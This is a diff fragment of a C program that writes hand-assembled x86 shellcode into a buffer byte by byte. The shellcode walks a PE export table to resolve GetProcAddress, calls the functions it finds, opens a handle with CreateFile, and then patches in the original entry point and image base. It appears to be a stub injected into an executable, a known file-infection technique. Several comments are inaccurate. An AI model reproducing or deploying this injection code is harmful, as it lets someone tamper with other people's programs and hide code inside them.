+		buf[stSize + i32stSizeCnt++] = '\x78';// add ebx,0x78
+
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xf6';// xor esi,esi
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x33';// mov esi, [ebx]
+
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xdb';// xor ebx, ebx
+
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xf3';// mov ebx, esi
+
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xc3';// add ebx, eax
 
 		buf[stSize + i32stSizeCnt++] = '\x89';
 		buf[stSize + i32stSizeCnt++] = '\x5c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\xfc';// mov ebx,eax// add ebx, 0x20
+		buf[stSize + i32stSizeCnt++] = '\xfc';// mov [esp-4], ebx
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc3';
 		buf[stSize + i32stSizeCnt++] = '\x20';// add ebx, 0x20
 
-		buf[stSize + i32stSizeCnt++] = '\x8b';// mov ebx,[ebx]
-		buf[stSize + i32stSizeCnt++] = '\x1b';
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xf6';// xor esi, esi
 
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xd8';// add ebx, eax <- Name Pointer
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x33';// mov esi,[ebx] 
 
-		buf[stSize + i32stSizeCnt++] = '\x33';//
-		buf[stSize + i32stSizeCnt++] = '\xc0';// xor edx,edx
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xf3';// mov ebx, esi
 
-		buf[stSize + i32stSizeCnt++] = '\x33';
-		buf[stSize + i32stSizeCnt++] = '\xd2';// add edi, eax
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xc3';// add ebx, eax
 
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xc0';// xor eax ,eax
 
-		buf[stSize + i32stSizeCnt++] = '\x33';//
-		buf[stSize + i32stSizeCnt++] = '\xc9';// xor ecx,ecx
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xd2';// xor edx ,edx
+
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xc9';// xor cax ,ecx
+
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xf6';// xor esi ,esi
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x33';// mov esi, [ebx]
 
 		buf[stSize + i32stSizeCnt++] = '\x03';
 		buf[stSize + i32stSizeCnt++] = '\x34';
-		buf[stSize + i32stSizeCnt++] = '\x24';// add esi, [esp]
+		buf[stSize + i32stSizeCnt++] = '\x24';//add esi,[esp]
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x7c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x04';// mov edi,[esp+4]
+		buf[stSize + i32stSizeCnt++] = '\x8';//mov edi,[esp+0x8]
 
 		buf[stSize + i32stSizeCnt++] = '\x81';
 		buf[stSize + i32stSizeCnt++] = '\xc7';
 		buf[stSize + i32stSizeCnt++] = '\x00';
 		buf[stSize + i32stSizeCnt++] = '\x05';
 		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';// add edi,0x500 <- GetProcAddress
-
-
-		buf[stSize + i32stSizeCnt++] = '\x8a';
-		buf[stSize + i32stSizeCnt++] = '\x16';// mov dl, byte[esi]
+		buf[stSize + i32stSizeCnt++] = '\x0';//add edi, 0x500
 
 		buf[stSize + i32stSizeCnt++] = '\x8a';
-		buf[stSize + i32stSizeCnt++] = '\x0f';// mov cl, byte ptr [edi]
+		buf[stSize + i32stSizeCnt++] = '\x16';//mov dl,[esi]
+
+		buf[stSize + i32stSizeCnt++] = '\x8a';
+		buf[stSize + i32stSizeCnt++] = '\x0f';//mov cl,[edi]
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc6';
-		buf[stSize + i32stSizeCnt++] = '\x01';// add esi, 1
+		buf[stSize + i32stSizeCnt++] = '\x01';//add esi, 1
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc7';
-		buf[stSize + i32stSizeCnt++] = '\x01';// add edi, 1
+		buf[stSize + i32stSizeCnt++] = '\x01';// add edi,1
 
-		buf[stSize + i32stSizeCnt++] = '\x3a';
-		buf[stSize + i32stSizeCnt++] = '\xca';// cmp cl,dl
+		buf[stSize + i32stSizeCnt++] = '\x38';
+		buf[stSize + i32stSizeCnt++] = '\xd1';// cmp cl,dl
 
 		buf[stSize + i32stSizeCnt++] = '\x74';
-		buf[stSize + i32stSizeCnt++] = '\xf2';// je mov dl, byte[esi]
-
+		buf[stSize + i32stSizeCnt++] = '\xf2';// je
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc3';
@@ -856,36 +702,42 @@ int main(int argc, char* argv[])
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc0';
-		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\x01';// add eax,1
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xf9';// cmp ecx, 0
-		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\xf9';
+		buf[stSize + i32stSizeCnt++] = '\x00';// cmp ecx,0
 
-		buf[stSize + i32stSizeCnt++] = '\x75';//
-		buf[stSize + i32stSizeCnt++] = '\xd4';// jne 123
+		buf[stSize + i32stSizeCnt++] = '\x75';
+		buf[stSize + i32stSizeCnt++] = '\xd2';// jne up
 
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xc8';// mov ecx, eax
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xc1';// mov ecx, ebx
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x5c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\xfc';// mov ecx, eax 
+		buf[stSize + i32stSizeCnt++] = '\xfc';// mov ebx,[esp-4]
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc3';
-		buf[stSize + i32stSizeCnt++] = '\x24';// add ebx, 24
+		buf[stSize + i32stSizeCnt++] = '\x24';//add ebx,24
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x24';// mov eax, [esp]
+		buf[stSize + i32stSizeCnt++] = '\x24';// mov eax,[esp]
 
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\x03';// add eax, [ebx]
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xf6';// xor esi,esi
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xd8';// mov ebx, eax
+		buf[stSize + i32stSizeCnt++] = '\x33';// mov esi,[ebx]
+
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xf0';// add eax,esi
+
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xc3';// mov ebx, eax
 
 		buf[stSize + i32stSizeCnt++] = '\xb8';
 		buf[stSize + i32stSizeCnt++] = '\x02';
@@ -894,250 +746,310 @@ int main(int argc, char* argv[])
 		buf[stSize + i32stSizeCnt++] = '\x0';//mov eax, 2
 
 		buf[stSize + i32stSizeCnt++] = '\xf7';
-		buf[stSize + i32stSizeCnt++] = '\xe1';//mul ecx
+		buf[stSize + i32stSizeCnt++] = '\xe1';// mul ecx
 
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xd8';//add ebx, eax
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xc3';// add ebx, eax
 
-		buf[stSize + i32stSizeCnt++] = '\x33';
-		buf[stSize + i32stSizeCnt++] = '\xd2';//add ebx, eax
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xd2';//xor edx, edx
 
 		buf[stSize + i32stSizeCnt++] = '\x66';
 		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x13';//mov dx,word ptr[ebx]
+		buf[stSize + i32stSizeCnt++] = '\x13';//mov dx,[ebx]
 
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xca';//mov ecx, edx
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xd1';// mov ecx, edx
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x44';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\xfc';// mov ecx, eax 
+		buf[stSize + i32stSizeCnt++] = '\xfc';// mov eax,[esp-4]
 
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xd8';// mov ebx, [eax]
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xc3';// mov ebx, eax
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc3';
-		buf[stSize + i32stSizeCnt++] = '\x1c';// add ebx, 1c
+		buf[stSize + i32stSizeCnt++] = '\x1c';// add ebx,0x1c
 
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x24';// mov eax, [esp]
-
-
-
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xc3';// add eax, ebx
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x1b';// add ebx, [eax]
-
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x24';// add eax, [esp]
-
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xc3';// add ebx, ebx
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xd8';// mov ebx, ebx
-
-		buf[stSize + i32stSizeCnt++] = '\xb8';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x00';// mov eax, 4
-
-		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xe9';
-		buf[stSize + i32stSizeCnt++] = '\x01';// sub ecx, 1
-
-		buf[stSize + i32stSizeCnt++] = '\xf7';
-		buf[stSize + i32stSizeCnt++] = '\xe1';// mul ecx
-
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xd8';// add ebx, eax
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x1b';// mov ebx,[ebx]
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x04';
 		buf[stSize + i32stSizeCnt++] = '\x24';// mov eax,[esp]
 
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xd8';// add ebx,eax
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xd8';// add eax, ebx
+
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xf6';//xor esi, esi
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x33';// mov esi,[ebx]
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x04';
+		buf[stSize + i32stSizeCnt++] = '\x24';// mov eax,[esp]
+
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xf0';// add eax, esi
+
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xc3';// mov ebx, eax
+
+		buf[stSize + i32stSizeCnt++] = '\xb8';
+		buf[stSize + i32stSizeCnt++] = '\x04';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';//mov eax ,4
+
+		buf[stSize + i32stSizeCnt++] = '\x83';
+		buf[stSize + i32stSizeCnt++] = '\xe9';
+		buf[stSize + i32stSizeCnt++] = '\x01';// sub ecx,1
+
+		buf[stSize + i32stSizeCnt++] = '\xf7';
+		buf[stSize + i32stSizeCnt++] = '\xe1';// mul ecx
+
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xc3';//add ebx, eax
+
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xf6';//xor esi, esi
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x33';//mov esi,[ebx]
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x04';
+		buf[stSize + i32stSizeCnt++] = '\x24';//mov eax,[esp]
+
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xf3';// mov ebx,esi
+
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xc3';// add ebx,eax
 
 		buf[stSize + i32stSizeCnt++] = '\x53';// push ebx
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x4c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x08';// mov ecx, [esp+8]
+		buf[stSize + i32stSizeCnt++] = '\x0c';// mov ecx,[esp+0xc]
 
 		buf[stSize + i32stSizeCnt++] = '\x81';
 		buf[stSize + i32stSizeCnt++] = '\xc1';
 		buf[stSize + i32stSizeCnt++] = '\x20';
 		buf[stSize + i32stSizeCnt++] = '\x05';
 		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';// add ecx, 0x520
+		buf[stSize + i32stSizeCnt++] = '\x0';//add ecx,0x520
 
-		buf[stSize + i32stSizeCnt++] = '\x51';
+		buf[stSize + i32stSizeCnt++] = '\x51';//push ecx
 
-		buf[stSize + i32stSizeCnt++] = '\x50';
+		buf[stSize + i32stSizeCnt++] = '\x50';//push eax
 
 		buf[stSize + i32stSizeCnt++] = '\xff';
-		buf[stSize + i32stSizeCnt++] = '\xd3';
+		buf[stSize + i32stSizeCnt++] = '\xd3';// call ebx
 
-		buf[stSize + i32stSizeCnt++] = '\x50';
+		buf[stSize + i32stSizeCnt++] = '\x50';// push eax
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x4c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x0c';// mov ecx,[esp+0xc]
+		buf[stSize + i32stSizeCnt++] = '\x08';// mov ecx,[esp+8]
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x54';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x08';// mov ecx,[esp+0x8]
-
+		buf[stSize + i32stSizeCnt++] = '\x10';// mov edx,[esp+10]
 
 		buf[stSize + i32stSizeCnt++] = '\x81';
-		buf[stSize + i32stSizeCnt++] = '\xc1';
+		buf[stSize + i32stSizeCnt++] = '\xc2';
 		buf[stSize + i32stSizeCnt++] = '\x40';
 		buf[stSize + i32stSizeCnt++] = '\x05';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x00';// add ecx,0x540
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';// add edx,0x540
 
+		buf[stSize + i32stSizeCnt++] = '\x52';//push edx
 
-		buf[stSize + i32stSizeCnt++] = '\x51';
-
-		buf[stSize + i32stSizeCnt++] = '\x52';
+		buf[stSize + i32stSizeCnt++] = '\x51';//push ecx
 
 		buf[stSize + i32stSizeCnt++] = '\xff';
-		buf[stSize + i32stSizeCnt++] = '\xd3';
+		buf[stSize + i32stSizeCnt++] = '\xd3';// call ebx
 
-		buf[stSize + i32stSizeCnt++] = '\x50';
-
-
+		buf[stSize + i32stSizeCnt++] = '\x50';// push eax
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x4c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x10';// mov ecx,[esp+0x10]
+		buf[stSize + i32stSizeCnt++] = '\x0c'; //mov ecx,dword ptr[esp+0xc]
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x54';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x0c';// mov edx,[esp+0x8]
-
+		buf[stSize + i32stSizeCnt++] = '\x14'; //mov edx,dword ptr[esp+0x14]
 
 		buf[stSize + i32stSizeCnt++] = '\x81';
-		buf[stSize + i32stSizeCnt++] = '\xc1';
+		buf[stSize + i32stSizeCnt++] = '\xc2';
 		buf[stSize + i32stSizeCnt++] = '\x80';
 		buf[stSize + i32stSizeCnt++] = '\x05';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x00';// add ecx,0x580
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0'; //add edx,0x580
 
-		buf[stSize + i32stSizeCnt++] = '\x51';
+		buf[stSize + i32stSizeCnt++] = '\x52';//push edx
 
-		buf[stSize + i32stSizeCnt++] = '\x52';
+		buf[stSize + i32stSizeCnt++] = '\x51';//push ecx
 
 		buf[stSize + i32stSizeCnt++] = '\xff';
-		buf[stSize + i32stSizeCnt++] = '\xd3';
+		buf[stSize + i32stSizeCnt++] = '\xd3';// call ebx
 
-		buf[stSize + i32stSizeCnt++] = '\x50';
+		buf[stSize + i32stSizeCnt++] = '\x50';//push eax
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x74';
+		buf[stSize + i32stSizeCnt++] = '\x4c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x14';// mov esi, [esp+0x14]
+		buf[stSize + i32stSizeCnt++] = '\x10';//mov ecx,[esp+0x10]
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x54';
+		buf[stSize + i32stSizeCnt++] = '\x24';
+		buf[stSize + i32stSizeCnt++] = '\x18';//mov edx,[esp+0x18]
 
 		buf[stSize + i32stSizeCnt++] = '\x81';
-		buf[stSize + i32stSizeCnt++] = '\xc6';
-		buf[stSize + i32stSizeCnt++] = '\x20';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x00';// add esi,0x420
+		buf[stSize + i32stSizeCnt++] = '\xc2';
+		buf[stSize + i32stSizeCnt++] = '\xa0';
+		buf[stSize + i32stSizeCnt++] = '\x05';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';// add edx,0x5a0
+
+		buf[stSize + i32stSizeCnt++] = '\x52';//push edx
+
+		buf[stSize + i32stSizeCnt++] = '\x51';//push ecx
+
+		buf[stSize + i32stSizeCnt++] = '\xff';
+		buf[stSize + i32stSizeCnt++] = '\xd3';// call ebx
+
+		buf[stSize + i32stSizeCnt++] = '\x50';// push eax
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x4c';
+		buf[stSize + i32stSizeCnt++] = '\x24';
+		buf[stSize + i32stSizeCnt++] = '\x14';// mov ecx,[esp+0x14]
+
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x54';
+		buf[stSize + i32stSizeCnt++] = '\x24';
+		buf[stSize + i32stSizeCnt++] = '\x1c';// mov edx,[esp+0x1c]
+
+		buf[stSize + i32stSizeCnt++] = '\x81';
+		buf[stSize + i32stSizeCnt++] = '\xc2';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x06';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';// add edx,0x600
+
+		buf[stSize + i32stSizeCnt++] = '\x52';// push edx
+
+		buf[stSize + i32stSizeCnt++] = '\x51';// push ecx
+
+		buf[stSize + i32stSizeCnt++] = '\xff';
+		buf[stSize + i32stSizeCnt++] = '\xd3';// call ebx
+
+		buf[stSize + i32stSizeCnt++] = '\x50';// push eax
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x5c';
+		buf[stSize + i32stSizeCnt++] = '\x24';
+		buf[stSize + i32stSizeCnt++] = '\x10';// mov ebx,[esp+0x10]
 
 		buf[stSize + i32stSizeCnt++] = '\x6a';
-		buf[stSize + i32stSizeCnt++] = '\x00';//  push 0
+		buf[stSize + i32stSizeCnt++] = '\x0';// push 0
 
 		buf[stSize + i32stSizeCnt++] = '\x6a';
-		buf[stSize + i32stSizeCnt++] = '\x00';//  push 0
+		buf[stSize + i32stSizeCnt++] = '\x0';// push 0
 
 		buf[stSize + i32stSizeCnt++] = '\x6a';
-		buf[stSize + i32stSizeCnt++] = '\x03';//  push 3
+		buf[stSize + i32stSizeCnt++] = '\x03';// push 3
 
 		buf[stSize + i32stSizeCnt++] = '\x6a';
-		buf[stSize + i32stSizeCnt++] = '\x00';//  push 0
+		buf[stSize + i32stSizeCnt++] = '\x00';//push 0
 
 		buf[stSize + i32stSizeCnt++] = '\x6a';
-		buf[stSize + i32stSizeCnt++] = '\x00';//  push 0
+		buf[stSize + i32stSizeCnt++] = '\x00';// push 0
 
 		buf[stSize + i32stSizeCnt++] = '\x68';
 		buf[stSize + i32stSizeCnt++] = '\x00';
 		buf[stSize + i32stSizeCnt++] = '\x00';
 		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\xc0';// push c00000000
+		buf[stSize + i32stSizeCnt++] = '\xc0';// push 0xc0000000
 
-		buf[stSize + i32stSizeCnt++] = '\x56';// push esi
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x4c';
+		buf[stSize + i32stSizeCnt++] = '\x24';
+		buf[stSize + i32stSizeCnt++] = '\x38';//mov ecx, [esp+0x38]
 
+		buf[stSize + i32stSizeCnt++] = '\x81';
+		buf[stSize + i32stSizeCnt++] = '\xc1';
+		buf[stSize + i32stSizeCnt++] = '\x20';
+		buf[stSize + i32stSizeCnt++] = '\x04';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';//add ecx,0x420 
+
+		buf[stSize + i32stSizeCnt++] = '\x51';// push ecx
+
+		buf[stSize + i32stSizeCnt++] = '\xff';
+		buf[stSize + i32stSizeCnt++] = '\xd3';
+
+		buf[stSize + i32stSizeCnt++] = '\x50';// push eax
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x5c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x24';//mov eax,dword ptr[esp+4]
+		buf[stSize + i32stSizeCnt++] = '\x10';// mov ebx,[esp+0x10] 
 
 		buf[stSize + i32stSizeCnt++] = '\xff';
-		buf[stSize + i32stSizeCnt++] = '\xd3';// call ebx<-CreateFile
+		buf[stSize + i32stSizeCnt++] = '\xd3';
 
-
-		buf[stSize + i32stSizeCnt++] = '\x50';// push eax <- PipeNumber
+		buf[stSize + i32stSizeCnt++] = '\x50';
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x5c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x08';//mov ebx,dword ptr[esp+8]
+		buf[stSize + i32stSizeCnt++] = '\x18';// mov ebx,[esp+0x18]
 
-		buf[stSize + i32stSizeCnt++] = '\xff';
-		buf[stSize + i32stSizeCnt++] = '\xd3';// call ebx <- GetCurrentProcessId
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x44';
+		buf[stSize + i32stSizeCnt++] = '\x24';
+		buf[stSize + i32stSizeCnt++] = '\x28';// mov eax,[esp+0x28]
 
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xc6';// mov esi, eax
 
-		buf[stSize + i32stSizeCnt++] = '\x50';//push eax
+		buf[stSize + i32stSizeCnt++] = '\x81';
+		buf[stSize + i32stSizeCnt++] = '\xc6';
+		buf[stSize + i32stSizeCnt++] = '\x58';
+		buf[stSize + i32stSizeCnt++] = '\x04';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';// add esi,0x458
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x7c';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x1c';//mov edi,[0x1c]
-
-		buf[stSize + i32stSizeCnt++] = '\x81';
-		buf[stSize + i32stSizeCnt++] = '\xc7';
-		buf[stSize + i32stSizeCnt++] = '\x64';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';// add edi,0x464
-	
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x54';
-		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x20';// edx,[esp+0x20]
+		buf[stSize + i32stSizeCnt++] = '\x2c';// mov edi,[esp+0x2c] 
 
 		buf[stSize + i32stSizeCnt++] = '\x89';
-		buf[stSize + i32stSizeCnt++] = '\x17';// mov [edi], edx
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xcf';// mov ecx,edi
+		buf[stSize + i32stSizeCnt++] = '\x3e';// mov [esi],edi
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xc1';
-		buf[stSize + i32stSizeCnt++] = '\x04';// add ecx, 04
+		buf[stSize + i32stSizeCnt++] = '\xc6';
+		buf[stSize + i32stSizeCnt++] = '\x04';// add esi,4
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x3c';
+		buf[stSize + i32stSizeCnt++] = '\x24';// mov edi,[esp]
 
 		buf[stSize + i32stSizeCnt++] = '\x89';
-		buf[stSize + i32stSizeCnt++] = '\x01';// mov [ecx], eax
+		buf[stSize + i32stSizeCnt++] = '\x3e';// mov [esi],edi
 
 
 		char cOEP[4] = { 0 };
@@ -1149,21 +1061,20 @@ int main(int argc, char* argv[])
 		buf[stSize + i32stSizeCnt++] = cOEP[2];
 		buf[stSize + i32stSizeCnt++] = cOEP[3];
 
-
 		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xc1';
-		buf[stSize + i32stSizeCnt++] = '\x04';// add ecx, 0x4
+		buf[stSize + i32stSizeCnt++] = '\xc6';
+		buf[stSize + i32stSizeCnt++] = '\x04';// add esi, 0x4
 
 		buf[stSize + i32stSizeCnt++] = '\x89';
-		buf[stSize + i32stSizeCnt++] = '\x39';
+		buf[stSize + i32stSizeCnt++] = '\x3e';// mov [esi],edi
 
 
 		char cImageBase[4] = { 0 };
